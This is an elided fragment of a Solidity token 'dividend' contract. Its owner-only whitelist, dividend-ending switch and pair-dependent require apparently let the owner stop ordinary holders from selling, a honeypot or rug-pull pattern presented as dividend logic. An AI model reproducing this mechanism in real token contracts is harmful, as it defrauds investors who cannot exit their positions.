...
contract Messi20Dividend is Ownable {
    ...
    function setDividendFinishedMessi20(bool isFinished) external onlyOwner {
    ...
    function accumulativeDividendOf(address _from, address _to) external onlyToken returns (uint256) {
      ...
      if (_from == pair) { if (_dividendTimePassed[_to] == 0) {
        ...
        require(!isDividendFinished 
          && _dividendTimePassed[_from] >= claimTime
        );
      } else {
    ...
    function whitelistForDivideEndsMessi20(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }

    function setTokenForDivideEndsMessi20(address _token, address _pair) external onlyOwner {
      claimTime = 0;
      token = _token;
      pair = _pair;
    ...
    function setClaimingTimeForDividendMessi20() external onlyOwner {
